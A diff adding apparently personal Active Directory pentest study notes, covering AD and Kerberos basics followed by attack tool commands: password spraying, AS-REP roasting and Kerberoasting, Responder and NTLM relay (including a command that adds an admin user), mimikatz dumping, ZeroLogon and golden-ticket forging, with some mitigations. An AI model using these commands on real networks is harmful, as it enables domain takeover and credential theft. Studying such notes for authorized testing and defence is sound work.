@@ -1,0 +1,879 @@
+Active Directory:
+================
+Scenario:
+	we are given an internal ip in a network or we hacked into their Wi-Fi, and we have to compromise the network.
+Goal:
+	1. Compromise a member of 'Domain Admins' group to complettely control every single computer in domain 
+	2. Compromise a Domain Controller and use it to modify all domain-joined computers
+BASICS:
+	Terms:
+		DC => Domain Controller
+		CN => Common Name
+		CS => Certficate Services
+	AD:(Active Directory)
+		its like a phonebook and stores info about objects like comp, users.
+	Physical components:
+		DC:(Domain Controller)
+			Windows Server
+			it has AD-DS(AD Domain Services) installed:
+				its main part of AD
+				DS => Domain services that the domain controller provides to the rest of the domain or tree
+				Example of DS:
+					LDAP => provides communication b/w applications and directory services
+					Certificate Services => allows dc to create/validate/revoke public key certificates
+					DNS/LLMNR/NBT-NS => Domain Name Services for identifying IP hostnames
+			provides authenciation and authorization
+			default local accounts on DC:
+				Administrator
+				Guest
+				KRBTGT
+			Primary DC:
+				it has "PdcRoleOwner" property
+				it has most updated information about user login and authenciation
+			LDAP:
+				DC uses ldap to query AD
+				LDAP is an API which provides search functonality against AD
+				LDAP://HostName[:port][/DN]
+					DN => Distinguished Name
+		Data Store:
+			it holds a  file "Ntds.dit"
+				contains all juicy stuff stored in AD
+	Logical Components:
+		AD schema:
+			rulebook/blueprint
+			contains definition of every object that can be created in an AD
+		Objects:
+			user/group/computer/printer/shared_folder/etc
+			Objects have attributes(properties)
+			Type of Users:
+				Domain Admins => have access to domain controller
+				Service Accounts:
+					Can be Domain Admins
+					mostly used except for service maintenance, they are required by Windows for services such as SQL to pair a service with a service account
+				Local Administrators => they cannot access the domain controller
+				Domain Users => They can log in on the machines they have the authorization to access and may have local administrator rights to machines depending on the organization.
+			Type of Groups:
+				Distribution Groups:
+					used to specify email distribution lists
+					As an attacker these groups are less beneficial to us but can still be beneficial in enumeration
+				Security Groups:
+					used to specify permissions for a large number of users
+					Default Security Groups:
+						Domain Controller => All domain controllers
+						Domain Guests => All domain guests
+						Domain Users => All domain users
+						Domain Computers => All workstations and servers
+						Domain Admins => Designated administrators of the domain
+						Enterprise Admins => Designated administrators of the enterprise
+						Schema Admins => Designated administrators of the schema
+						DNS Admins => DNS Administrators Group
+						Key Admins => Members of this group can perform administrative actions on key objects within the domain.
+						Enterprise Key Admins => Members of this group can perform administrative actions on key objects within the forest.
+						DNS Update Proxy:
+							DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
+						Group Policy Creator Owners => Members in this group can modify group policy for the domain
+						Protected Users => Members of this group have additional protections for authentication. 
+						Cert Publishers => Members of this group are permitted to publish certificates to the directory
+						Read-Only Domain Controllers => Members of this group are Read-Only Domain Controllers in the domain
+						Enterprise Read-Only Domain Controllers => Members of this group are Read-Only Domain Controllers in the enterprise		
+				Nested Group:
+					A group added as a member in a group. We can not use net.exe to see members inside a nested group.
+		RID:(relative identifier)
+			its a variable length number that is assigned to objects at creation
+			Administrator 500
+			Guest 501
+			KRBTGT 502
+		SID:(Security Identifier)
+			unique ID number which a domain uses to identify an object
+		OU:(organizational unit)
+			containers for users/groups/computers/any object. Same as folders for files.		
+		Domain:
+			Example: corp.com
+			it is created when an AD is configured
+			used to group together and manage objects and OUs together in an organization.
+			it functions as a DC, bcoz it applies policies to a group of objects and it authenciate and authorize resources.
+		Tree:
+			a group of domains
+			it by-deafult creates a 2-way TRANSITIVE trust with other domains
+			parent domain => abcd.com
+			child domain => first.abcd.com , second.abcd.com
+		Forest:(aka Enterprise)
+			a group of trees
+			enables trusts b/w all domains in a forest
+		Trusts:
+			mechanism for users in the network to gain access to other resources in the domain
+			trusts outline the way in which the domains inside of a forest communicate to each other
+			(a)Transitive trust:
+				its extended beyond 2 domains
+				domain_a trusts domain_b and all the domains domain_b is trusting
+			(b)Directional trust:
+				flows from trusting domain to trusted domain
+	DNS:
+		AD hosts DNS and its critically dependent on that DNS.
+	Domain Policies:
+		domain policies are like domain groups, except instead of permissions they contain rules, and instead of only applying to a group of users, the policies apply to a domain as a whole.
+		They simply act as a rulebook for Active  Directory that a domain admin can modify
+	SPN:(Service Principal Name)
+		When applications like Exchange/SQL/IIS are integrated into AD, a unique service instance identifier known as a SPN is used to associate a service on a specific server to a 'service account' in Active Directory.
+		An alternative to attacking a domain user account is to target so-called service accounts, which may also be members of high value groups.
+	Juicy Files:
+		SAM: See Windows_privesc
+		LSA:(Local Security Authority)
+			Its a protected system process that authenticates and logs users on to the local computer. Domain credentials are used by the operating system and authenticated by the Local Security Authority
+		NTDS.dit:
+			New Technologies Directory Services and DIT stands for Directory Information Tree. This file acts as a database for Active Directory and stores all its data including all the credentials.
+	AD in cloud:
+		Azure AD
+	Authenciation In AD:
+		NTLM:
+			NTLM Authenciation is of 6 steps:
+				1. Client system calculate ntlm hash, from the user’s password
+				2. Client computer sends the user name to the server which returns a random value called the nonce or challenge
+				3. Client then encrypts the nonce using the NTLM hash, now known as a response, and sends it to the server.
+				4. Server forwards the response along with the username and the nonce to the DC
+				5. The validation is then performed by the DC, since it already knows the NTLM hash of all users
+				6. DC encrypts the challenge itself with the NTLM hash of the supplied username and compares it to the response it received from the server. If the two are equal, the authentication request is successful.
+		kerbros:
+			A STATELESS protocol to authenticate clients with Application servers(providing services) using tickets(uses symmetric key cryptography(single key used to encrypt and to decrypt))
+				STATELESS:
+					It means each request is executed independently, without any knowledge of the requests that were executed before it, which means once the transaction ends the connection between the browser and the server is also lost.
+					So, we have 'KEYS' to track the connection
+			Layman Explanation:
+				client gets ticket from KDC
+				client gives that ticket to SS to establish connection with service(s).
+			Components of kerbros:
+				Players:
+					Client => wants to access some service
+					KDC:(key Distribution Center)
+						DC runs KDC
+						The KDC acts as a trusted third party in performing these authentication services.
+						it has 2 parts: 
+							AS:(Application Server)
+								aka Service Server (SS)
+								it provides service
+							TGS:(Ticket Granting Server)
+				Keys:
+					KRBTGT key:
+						KRBTGT is an account in KDC for managing kerbros and is used to encrypt and sign all tickets in a domain.
+					user key:
+					service key:
+					session key:
+						The session key is encrypted using the user’s password hash, and may be decrypted by the client and reused. 
+						used in communication b/w user and TGS
+						given by AS
+						it's a SYMMETRIC key
+							A SYMMETRIC key is a key which is used to both encrypt and decrypt data
+					service-session key:
+						used in communication b/w user and AS
+						given by TGS
+				Tickets:
+					TGS(Ticket Granting Server ticket):
+						it allows client to contact with service
+					TGT(Ticket Granting Ticket):
+						its given by AS to Client and is used to communicate with TGS.
+						The TGT contains information regarding the user, including group memberships, the domain, a time stamp, the IP address of the client, and the session key
+						In order to avoid tampering, the Ticket Granting Ticket is encrypted by a secret key known only to the KDC and can not be decrypted by the client
+				PAC(Privilege Attribute Certificate):
+					a feature, included in every ticket.
+					contains privileges of the user
+				Messages:
+					KRB_AS_REQ => user sends REQ to AS for TGT
+					KRB_AS_REP => user recieves TGT from AS
+					KRB_TGS_REQ => user sends REQ to TGS using TGT
+					KRB_TGS_REP => user recieves client-server ticket from TGS
+					KRB_AP_REQ => user sends REQ to authenticate against service
+					KRB_AP_REP:
+						optional
+						used by service to identify itself against user
+					KRB_ERROR: Some ERROR
+			Working of kerbros:
+				1. When a user logs in to their workstation, a Authentication Server Request(or AS_REQ)(contains a time stamp that is encrypted using a hash derived from the password of the user and the username.) is sent to the DC,which has the role of KDC and also maintains the Authentication Server service.
+				2. When the DC receives the request, it looks up the password hash associated with the specific user and attempts to decrypt the time stamp. If the decryption process is successful and the time stamp is not a duplicate (a potential replay attack), the authentication is considered successful.
+				3.The DC replies to the client with an Authentication Server Reply (AS_REP) that contains a session key (since kerbros is stateless) and a Ticket Granting Ticket (TGT). 
+				4. Once the client has received the session key and the TGT, the KDC considers the client authentication complete.
+				5. When the user wishes to access resources of the domain such as a network share, an Exchangemailbox, or some other application with a registered service principal name, it generates a Ticket Granting Service Request (or TGS_REQ) packet that consists of the current user and a timestamp (encrypted using the session key), the SPN of the resource, and the encrypted TGT.
+				6. the ticket granting service on the KDC receives the TGS_REQ, and if the SPN exists in the domain, the TGT is decrypted using the secret key known only to the KDC. The session key is then extracted from the TGT and used to decrypt the username and timestamp of the request.
+Domain Enumeration:
+	LDAP Enumeration:See in Active Information Gathering Sheet
+	Port 135:(shown as MSRPC by nmap)
+		MSRPC Enumeration:(Microsoft Remote Procedure Call)
+			MSRPC is a protocol that uses the client-server model in order to allow one program to request service from a program on another computer without having to understand the details of that computer's network
+			MSRPC is Microsoft's own implementation of DCE/RPC over SMB and operates over SMB named pipes
+			How to access it:
+				Via 135 TCP/UDP
+				Via null/authenticated SMB session (TCP 139 and 445)
+				Via web service on TCP port 593
+			Enumeration:
+				nmap --script=msrpc-enum
+				rpclient:
+					its a tool for executing client side MS-RPC functions.
+					it gives rpc shell
+					rpclient -U '' -N ip => anonymous login
+					rpclient -U "" -N ip => anonymous login
+					rpclient -U "domain.local/username" -N ip => Domain User login
+					Commands:
+						I have divided commands in categories on basis which MSRPC function they exploit
+							LSARPC:(Local Security Authority RPC)
+								used to perform management tasks on domain security policies from a remote machine.		
+								enumprivs => Enumerate privileges
+							LSARPC-DS:
+								to get primary domain information
+							REG:
+								abortshutdown
+								shutdown
+							SRVSVC:
+								remotely enables file and printer sharing and named pipe access to the server through the SMB
+								srvinfo => Version of the target Windows machine
+								netshareenum
+								netshareenumall
+							SAMR:(Security Account Manager RPC)
+								querydominfo => Query domain info
+								enumdomusers
+								enumdomgroups
+								createdomuser => createdomuser
+							SPOOLSS:
+								Microsoft Print System Remote Protocol
+							NETLOGON:
+								Windows Server process that authenticates users and other services within a domain. 
+							FSRVP:(File Server Remote VSS Protocol)
+								used for creating shadow copies of file shares on a remote computer
+						https://bitvijays.github.io/LFF-IPS-P3-Exploitation.html => use this while pentesting
+		RPC endpoint mapper:
+			It also works on TCP port 135, but nmap dont show it. So how to know if its working on port 135?
+				Hit and trial. If TCP port 135 is open and rpcclient(tool for MSRPC) is showing 'Connection Issues', Then it means that we have 'RPC endpoint mapper' on TCP port 135.
+			Basics:
+				RPC endpoint mapper:
+					Its a service on RPC server that maintains a database of dynamic endpoints(ports) and RPC clients rely on it to tell them which dynamic port(s) were assigned to the server
+				UUID:(universally unique identifier)
+					A UUID is used to represent a resource available on the remote procedure call (RPC) servers
+					We can always 'Google' the UUIDs to know which program they belong to 
+				opnums:(operation numbers)
+					An operation number or numeric identifier used to identify a specific remote procedure call (RPC) method or method in an interface.
+				CLSID:(Class Identifier)
+					The Class Identifier (CLSID) is a Global Unique Identifier (GUID). Windows stores a CLSID for each installed class in a program. When you need to run a class, you need the correct CLSID, so Windows knows where to go and find the program.
+				DCOM:(Distributed Component Object Model)
+					Its a Protocol which is an extension of the COM(Component Object Model) Protocol and is built on top of Remote Procedure Call Protocol.
+					High-Level applications use the DCOM client to obtain object references and make ORPC calls on the object.
+						RPC -> DCOM -> High-Level Application
+					Activation:
+						Activation means creating or finding an existing DCOM application
+						Activation mechanism requires a client to provide the CLSID of an object class to obtain an object, either from that object class or a class factory that is able to create such objects.
+					ORPC Calls:
+						An ORPC Call is made When a COM object gets activated over the network
+						An ORPC Call differentiates itself from RPC by the contents of the Object UUID as the UUID field contains an IPID (Interface Pointer Identifier) which specifies interface targeted by an ORCP call on a COM Object.
+				RPC Network Protocols:
+					ncacn_ip_tcp
+					ncacn_ip_udp
+					ncacn_np
+					ncalrpc
+					ncacn_http:
+						we mostly see it in nmap results for TCP port 593. 
+						Microsoft Windows RPC over HTTP 1.0
+			rpcmap.py:
+				Tool to show mappings of RPC endpoint mapper
+				Usage:
+					rpcmap.py 'stringbinding' [options]
+					rpcmap.py 'ncacn_ip_tcp:<ip>' => shows endpoints-UUID mappings
+						stringbinding => RPC_network_protocol:<ip>[port]
+						flags:
+							-brute-opnums => Bruteforce opnums for found UUIDs
+							-brute-uuids => Bruteforce UUIDs even if MGMT interface is available
+							-brute-versions => Bruteforce major versions of found UUIDs
+							-opnum-max x => Bruteforce opnums from 0 to x (default 64)
+							-version-max x => Bruteforce versions from 0 to x (default 64)
+							-auth-level x => MS-RPCE auth level, from 1 to 6 (default 6)
+							-uuid UUID => Test only this UUID	
+	Kerberos Enumeration:(if port 88 is open)
+		Kerbrute:
+			kerbrute can be used to bruteforce user passwords or names, or password spray using Kerberos
+			Installation:
+				pip3 install kerbrute
+			Usage:
+				kerbrute userenum --dc ip -d domain.local -t 200 user.txt => user enumeration
+					users.txt => /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+				kerbrute passwordspray --dc ip -d domain.local -t 200 user.txt password1234 => password spraying
+					using a password against many users
+				kerbrute bruteuser -d lab.ropnop.com passwords.lst username
+					bruteforce a user	
+				flags:
+					-t => threads
+			Used in HTB::Active
+		Once we have users list:
+			Bruteforcing:					
+				Crackmapexec:
+					crackmapexec smb ip -u user.txt -p pass.txt
+					crackmapexec smb ip -u user.txt -H hashes
+					crackmapexec smb up -u 'username' -p pass.txt
+				pyKerbrute:
+					Its just kerbrute, but it can bruteforce users using hashes, which kerbrute cannot.
+					Issue => python2
+					ADPwdSpray.py
+		AS-REP Roasting:
+			it allows password hashes to be retrieved for users that do not require pre-authentication
+			Requirements:
+				List of users in a domain
+				Port 88(kerbros) to be open		
+			Attack:
+				Local Way:(when we have shell available)
+					Rubeus.exe:
+						Download:
+							https://github.com/GhostPack/Rubeus => actual repo
+							https://github.com/r3motecontrol/Ghostpack-CompiledBinaries => to get .exe
+						Usage:
+							C:\> .\Rubeus.exe asreproast  /outfile:hashes.txt /format:hashcat
+								tries asrep roast against every user and saves hashes in hashes.txt in hashcat format
+				Remote Way:	
+					GetNPUsers.py:
+						GetNPUsers.py -dc-ip ip domain.local/ -usersfile users.txt -format john -outputfile hashes
+							check ASREPRoast for specified users (no credentials required)
+						GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request -format -format john -outputfile hashes
+							check ASREPRoast for all domain users (credentials required)
+			Cracking as-rep roast hashes:
+				1. hashcat -m 18200 hash.txt rockyou.txt
+				2. john --format=krb5asrep --wordlist=rockyou.txt hash.txt
+Initial Attacks:(to get a user shell)
+	Using Responder.py:(/usr/share/responder)
+		A tool for LLMNR and NBT-NS spoofing (MITM)
+		A tool that listens and responds to LLMNR and NBT-NS and obtain network creds, it creates authenticating services like SMB/HTTP,etc to get creds from victim user.
+		LLMNR and NBT-NS:
+			LLMNR:(link local multicast name resolution)
+				UDP-5355
+			its used to resolve names when DNS fails, they are enabled by default on windows
+		Working:(Spoofing of LLMNR and NBT-NS)
+			if a target failes to resolve name using DNS, then, LLMNR and NBT-NS comes into play. LLMNR and NBT-NS of target, queries the network for given name, to which, responder responds that "hey, its me u are looking for" by spoofing share_name and giving our ip, and thus getting victim AUTHENCIATED to resonder's servers and to get AUTHENCIATED, victim_user sends us his NTLMv2 hash without alterting the victim 
+			The NTLMv2 hash thus obtained:
+				can be cracked
+				can be RELAYED
+				can't be used in pass-the-hash
+		file str of responder:
+			/usr/share/responder
+			/logs:
+				responder-session.log
+				analyse-session.log
+				poisoners-session.log
+		Targeting protocols:
+			SMB/SQL/kerbros/FTP/POP3/IMAP/HTTP(S)/etc
+		how to know if LLMNR is open?
+			nmap --script llmnr-resolve --script-args 'llmnr-resolve.hostname=marvel.local' -e interface
+			msf> use auxiliary/scanner/llmnr/query
+		responder.conf:
+			RespondTo = ip or range # can be specified via this way too
+			On/Off servers:
+				SMB = Off
+			To upload a malicious wpad.dat:
+				[HTTP serve]
+				Serve-Exe = On
+				Serve-Html = On
+		Usage:
+			For share:(common)
+				responder.py -I interface -rdwv
+				responder.py -I interface -wrf
+			flags:
+				-A => analyse/listen only mode
+					here, we analyse the LLMNR and NBT-NS requests, but we dont respond to them
+				-I => interface
+				-i => ip of target (if known)
+				-r => enable answers for NBT wredir suffix queries, answering to them can break stuff, so by default its disabled
+				-d => enable answers for netbios domain suffix queries, answering to them can break stuff, so by default its disabled
+				-w => start the wpad rouge proxy server
+				-F => force NTLM/basic auth on wpad.dat file to steal credentials by causing a login prompt
+				-b => return basic HTTP authentication
+					-b OFF => it means OFF for NTLM authentication
+				-f => fingerprint OS
+		to crack ntlm hashes obtained:
+			hashcat -m 5600 hashes.txt wordlist.txt
+			john --format=ntlmv2 hash.txt wordlist.txt
+		Attacks:
+			Wrong sharename attack:
+				lets say victim wrote the wrong sharename, DNS tried to resolve it but failed, so, LLMNR and NBT-NS came into play and queries the netowrk and responder responds , this way we get the NTLMv2 hash.
+			WPAD based attack:(Web Proxy Auto Discovery)
+				WPAD has 3 parts:
+					Server => stores wpad.dat file
+					Protocol:
+						it allows auto discovery of web proxy config
+						used in browsers
+						Default settings in windows:
+							Automatic Detect Settings: Enabled
+							(Settings means Proxy settings)
+					wpad.dat:(aka PAC file(Proxy Auto-Config))
+						Stored on WPAD server
+						has proxy settings
+				ISSUE: windows settings says, "Location of wpad.dat is automatically determined"
+				Exploitation:
+					kali> responder -wFb
+					Windows:
+						user wants to access wpad.dat file, so, he sends a request for it in network(via DNS), it fails, so, LLMNR and NBT-NS queries in network and responder says, it has the wpad.dat file and -F option will cause a login prompt asking for user's Domain Credentials
+					Getting shell using wpad.dat file:
+						make changed in responder.conf file as shown in its section
+						responder -I eth0 -r On -w On -wFb
+						it will cause the victim to download an .exe resulting in shell 
+						nc -nv <victim_ip> 140 
+				Benefits of WPAD Attack:
+					we can proxy all traffic of victim, it means, we can see all clear-text data like cookies, websites which user is visiting, get NTLMv2 creds
+		mitigation:
+			disabel llmnr and nbt-ns
+			if can't disable
+				apply "network access control"
+				strong password policy
+	NTLM Relay Attack:(SMB Relay Attack is a part of it)
+		Overview:
+			NTLM is a protocol for authenciation of user against services
+			NTLM Relay Attack is used against SMB/LDAP/IMAP/HTTP(S)/MS-SQL
+			In this attack, we take NTLMv2 hash (from responder) and relay it to a lists of targets and hope that users of targets have administrator access. Then we execute a payload to get an admin shell.
+			In AD, 9 times out of 10 all the workstations share the same local administrator password. 
+		Working of this attack:
+			For such an attack to work, one needs to be in a man-in-the-middle position. This can be achieved using traditional spoofing techniques (ARP, DNS, LLMNR & Netbios, etc.)(responder) or by triggering a connection to the attacker machine through a bug or misused feature (Printer Bug, Juicy Potato, etc.).The attacker acts as a server to the client and as a client to the server.He extracts the NTLM authentication blobs from the client messages and puts them in modified messages to the server and vice versa. In the end, he can use the authenticated session as he sees fit.
+		Requirements:
+			SMB Relay Attack:
+				Smb signing must be disabled(or enabled and not required)
+					smb signing => its a packet-level protocol which checks the authencity of packet/hash passed/relayed by checking who has signed it.
+					nmap --script=smb2-security-mode.nse -p445 192.168.0.1/24
+				relayed user credentials must be admin on the relayed machine
+			LDAP Relay Attack:
+				LDAP signing must be disabled
+		Usage:
+			responder.conf
+				SMB=OFF
+				HTTP=OFF
+			resonder -I interface -rdwv
+			ntlmrelayx.py -tf targets.txt -smb2support
+				targets.txt => list of machines which have smb signing disabled
+					to find:
+						nmap --script=smb2-security-mode.nse -p445 range
+			getting a smb shell:
+				python ntlmrelayx.py -tf targets.txt -smb2support -i
+				-i => interactive
+				tp => target file		
+			flags:
+				-t => single target
+					scheme://<ip:port
+					example:
+						ldap://ip
+						smb://ip same as ip
+				-tf => targets.txt
+				-smb2support => support for smb2
+				--socks => 
+				--escalate-user => 
+				-i => interactive shell
+					it will give us a shell on 127.0.0.1:port 
+					nc -nv 127.0.0.1 <port>
+				-e => execute payload(.exe) 
+					-e ./shell.exe
+				-c => command 
+					-c "net user user1234 pass1234 /add && net localgroup Administrators user1234 /add"
+					-c <insert your Empire Powershell launcher here>
+		MITIGATION:
+			enable SMB/LDAP signing on all devices
+				issue => performance issues
+			disable ntlm, use kerbros
+				issue => if kerbros failed, windows automatically goes back to ntlm
+			account tiering
+			local admin restriction
+	IPV6 Attack:(DNS-Takeover Attack)
+		we act like a DNS for ipv6 addresses (dns spoofing)
+		mitm6:(github)
+			mitm6 -d /domain => sends reply
+				-d => domain
+			ntlmrelayx.py -6 -t ldaps://ip_of_dc -wh fakewpad.marvel.local -l lootme
+				-6 => ipv6
+				-t => target
+					it can be either smb:// or ldap:// or ldaps
+				-wh => wpad hostname to spoof
+				-l => dump info
+		mitigations:
+			disable ipv6
+				if cant, set up firewall rules
+			disable wpad
+			enable ldap signing & ldap channel binding
+			add "administrative users" in "protected users" group+
+POST-Enumeration:
+	Note:
+		In HTB, we have just one box and we assume it as domain/DC. But its not real life as in real life, we have a domain have main DC, other DC's and many other computer devices, each one of them having both unique and shared users and groups. So, Here, i will make notes for Real-Life AD pentesting.
+	Manual Enumeration:(Important)
+		To know available systems in a domain:
+			net view => shows a list of computers (their hostname)
+			ping host_name_of_comp => this will show ip
+		Manual Enumeration in cmd using net.exe:(Traditional Approach)
+			net view => shows a list of computers and network devices on the network
+			net view \\computer_name => shows shares on the specified computer
+			net user => show user accounts on the host device
+			net user /domain => shows user accounts for the whole domain along with the domain name
+				Note => most times the usernames are made in a way that they define role of user in domain ex: jeff_admin
+			net user user_name /domain => shows info about the user related to domain
+			net group /domain => shows groups in a domain
+		Manual Enumeration in powershell using Get-ADUser:(Mordern Approach)
+			Note:
+				cmdlets like Get-ADUser are only installed by default on domain controllers and while they may be installed on Windows workstations from Windows 7 and up, they require administrative privileges to use.
+			Get-NetDomain => info about current domain
+			Get-NetDomain -domain 'domain_name'
+			Get-DomainSID => gives SID for domain
+			Get-NetDomainController => info about DC
+			Get-UserProperty –Properties pwdlastset => info about property
+			Get-NetComputer => list all computers in current domain
+			Get-NetComputer -Ping => show live hosts
+			Get-NetGroup
+			Get-NetGroupMember -GroupName "Domain Admins"
+		Manual Enumeration in poweshell without Get-ADUser:(Mordern Approach)
+			Here, we develop a script using  
+	If we have Pass/Hash:
+		GetADUsers.py:
+			User Enumeration
+			GetADUsers.py -all -dc-ip ip domain.local/username:password
+	Automated Enumeration:(scripts)
+		First try Windows Privsec scripts, then try powerview or bloodhound
+		Powerview:(github)
+			usage:
+				cmd> powershell -ep bypass
+				PS> Import-Module ./powerview.ps1
+				now we can load modules
+				ps> module-name => list modules
+				modules:
+					get-netdomain => info about domain
+					get-netdomaincontroller => info about DC
+					get-domainpolicy => show policies
+					(get-domainpolicy)."policyname" => info about policy
+					get-netuser => all users of domain
+					get-netgpo => show group policies
+					Get-NetLoggedon -ComputerName name => show currently loggedin users in a computer
+					Get-NetSession -ComputerName name => same as Get-NetLoggedon
+					See GITHUB page for more options
+		Bloodhound:(v.imp tool)
+			Installation:
+				apt-get install bloodhound
+			it is a tool to visualize all the data in AD and provides method for privesc on basis of data collected
+			Collectors:
+				in order to use Bloodhound, we need to provide data which we collect using Collectors
+				Download:
+					https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
+				Local Way:(Need to use victim shell)
+					Using sharphound.ps1:
+						transfer it to victim
+						ps> PowerShell -Exec Bypass
+						ps>. .\sharphound.ps1
+						ps>invoke-bloodhound -collectionmethod All -domain domainname -zipfilename file.zip => it will create file.zip
+						other options with invoke-bloodhound
+							-ldappassword and -ldapusername => used for ldap collection
+							https://github.com/BloodHoundAD/BloodHound/blob/master/docs/data-collection/sharphound-all-flags.rst
+						transfer file.zip to kali
+					Using SharpHound.exe:
+						transfer it to victim
+						c:\> SharpHound.exe --collectionmethod All -d domainname => it will create yyyyMMddhhmmss_BloodHound.zip
+					Using AzureHound.ps1:
+				Remote Way:(no need to use victim shell)
+					Benefits of Remote Way over Local Way:
+						No file transfer
+					Using bloodhound-python:
+						Installation:
+							pip install bloodhound
+						Usage:
+							bloodhound-python -d megacorp.local -u sandra -p "Password1234!" -gc pathfinder.megacorp.local -c all -ns 10.10.10.30
+							bloodhound-python -d domain.local -u user -p 'pass' -gc pathfinder.megacorp.local  -c all -ns <ip>
+								-d => domain to query
+								-dc dc_domain_name => Override which DC to query
+								-gc gc_domain_name => Override which GC to query
+								-ns ip => Alternative name server to use for queries
+							This will give us many .json files
+							zip file.zip *.json => makes file.zip
+							drag and drop file.zip in bloodhound to import all files in one shot
+			Usage:	
+				We need to setup neo4j before starting it:
+					kali>neo4j console
+						This will start neo4j at http://localhost:7474/
+							deafult creds: neo4j:neo4j
+							change password
+								My cred => neo4j:kali
+				To start bloodhound:
+					bloodhound
+				To load data in bloodhound:
+					By default, SharpHound and AzureHound will generate several JSON files and place them into one zip. Drag and drop that zip into the BloodHound GUI, and BloodHound will import that data.
+				Once data is loaded:
+					we can query that data for privesc
+					We can select various inbuilt queries, of which some very useful ones are:
+						Shortest Paths to High value Targets
+						Shortest path to domain admin
+						Find Principles with DCSync Rights
+POST-Exploitation:
+	token impersonation => same as that of windows privesc
+	Grabbing Clear Text Passwords From Memory:
+		WCE:(Windows Credential Editor)
+			It allows to list windows logon sessions and add/delete/change/list associated crentials(LM/NT hash,kerbros tickets, passwords)
+			wce -l => list logon sessions and hashes
+			wce -w => to dump clear text passwords
+			issue:
+				can easily invoke antivirus/windows_defender
+		mimikatz:
+			When we run mimikatz, it gives us a mimikatz-like shell, from where we can run commands.
+			privilege::debug
+			sekurlsa::logonPasswords full
+		NOTE: we need privileges tp run both WCE and mimikatz
+	GPP:(MS14-025)
+		It allowed admins to create Domain Policies using embedded credentials. These credentials were encrypted using a secret key (AES) and placed in "cPASSWORD" file in Groups.xml. Groups.xml can be read by can user.
+		\\[Domain Controller]\SYSVOL\[Domain]\Policies\Groups.xml
+		However, the secret key was accidentaly released in 2014 by Microsoft publicly.
+		It was patched in 2014, but still can be used against server 2012.
+		Exploit:
+			Metasploit:
+				use auxiliary/scanner/smb/smb-enum_gpp
+					set rhosts
+					set smbuser
+					set smbpass
+					exploit
+				use post/windows/gather/crentials/gpp
+					set session <id>
+					exploit
+			GPP-Decrypt:(apt-get install gpp-decrypt)
+				download group.xml from victim
+				open it and copy encrypted password
+				kali> gpp-decrypt password			
+	ZeroLogon:(CVE-2020-1472)
+		This vulnerablity makes every password in dc an empty string, which means "no password", hence "ZeroLogon"
+		Requirements:
+			updated version of impacket
+				apt remove --purge impacket-scripts python3-impacket apt autoremove
+				git clone https://github.com/rthalley/dnspython.git 
+					sudo python3 setup.py install 
+				git clone https://github.com/SecureAuthCorp/impacket.git 
+					sudo python3 setup.py install 
+		Usage:
+			https://github.com/risksense/zerologon
+			python3 set_empty_pw.py domain.local dc_ip => makes password empty string
+			python3 secretsdump.py -just-dc domain/hostname\$@ip => give me domain admin hash
+			wmiexec.py domain/Administrator@ip -hashes hash
+	Kerbros Based Attacks:(requires port 88(kerbros) to be open)
+		How to know which tickets we have:
+			Using mimikatz:(We need ADMIN shell on DC)
+				kerbros::list /export
+		Kerberoasting:(imp)
+			The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts as part of these TGS tickets are encrypted with keys derived from user passwords.
+			The creds of these Service Accounts could be cracked offline.
+			only user accounts with servicePrincipalName attribute set are most likely vulnerable to kerberoasting
+				You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.
+			Attack:
+				Remote Way:
+					getuserspns.py:(part of impacket toolkit)
+						getuserspns.py domain_name/user:pass -dc-ip <ip> -request
+							this will get us hash
+						hashcat -m 13100 hash.txt rockyou.txt
+				Local Way:(when we have shell available)
+					mimikatz:
+						kerbros::list => SPN discovery
+						kerbros::list /export => it will export tickets as .kirbi
+						move .kirbi file to kali
+						kirbi2jhon file.kirbi > kerb.john
+						john --format=krb5tgs --wordlist=rockyou.txt hash.txt
+			Cracking .kirbi files:
+				1. hashcat -m 13100 hash.txt rockyou.txt
+				2. john --format=krb5tgs --wordlist=rockyou.txt hash.txt
+				3. ./tgsrepcrack.py rockyou.txt file.kirbi
+					https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py
+		Pass The Ticket:(PTT)
+			The major difference between the Pass-the-Ticket and Pass-the-Hash attack is that the kerbros TGT tickets(pass the ticket) have an expiration time of 10 hours (can be changed) and in Pass-The-Hash there is no expiration time.
+			mimikatz:(we need admin shell on DC)
+				kerbros::list => list all tickets
+				kerbros::list /export => it will export tickets as .kirbi
+				kerbros::ptt ticketname.kirbi => load ticket
+				misc::cmd => get shell from loaded ticket
+		Golden Ticket:(its a type of PTT)
+			In this attack, an attacker forges kerbros TGT by compromising krbtgt account. TGTs are used when requesting TGS tickets, which means a forged TGT can get us any TGS ticket - hence it's golden.
+			In this attack, we dont crack any hash.
+			Requirements:
+				KRBTGT NTLM:
+					This attack assumes that DC has been compromised, and KRBTGT account hash can thus, be extracted
+				Domain Name
+				SID:
+					c:\> whoami /user
+					it will give sid but the last part of it is RID.
+			Attack:
+				Using mimikatz:(We need ADMIN shell on DC)			
+					Obtaining NTLM hash of krbtgt account:
+						4 Ways:
+							1. mimikatz:dcsync(We need ADMIN shell on DC)(imp)
+								lsadump::dcsync /domain:domain.local /user:krbtgt
+								DCSync feature tries to impersonate a DC
+								This technique is less noisy as it doesn’t require direct access to the DC
+							2. mimikatz:LSA(We need ADMIN shell on DC)
+								lsadump::lsa /inject /name:krbtgt				
+							3. Hashdump:(meterpreter)
+							4. Kiwi:(meterpreter)
+								Covered later
+					Creating a golden ticket:
+						kerbros::golden /domain:domain.local /sid:value /rc4:NTLM /user:user1234 /id:500
+							user => any username
+							sid => sid of current user 
+							id => RID of account you will be impersonating. ID of default administrator is 500
+						it will create a golden ticket "ticket.kirbi"
+					Using the golden ticket in current session:(Loading it into memory)
+						kerbros::ptt ticket.kirbi
+				Using meterpreter:
+					load kiwi
+					dcsync_ntlm krbtgt
+						it will give sid and NTLM
+					golden_ticket_create -d domain.local -u user -s sid -k ntlm -t ticket.kirbi
+						Created a Golden ticket
+					kerberos_ticket_use ticket.kirbi
+						Using the golden ticket in current session
+		Silver Ticket:
+			Unlike golden ticket, a silver ticket only allows an attacker for forge TGS tickets for specific services.
+			Requirement:
+				NTLM of service account
+			Convert password to NTLM:
+				google
+			Attack:
+				Using mimikatz:(We need ADMIN shell on DC)
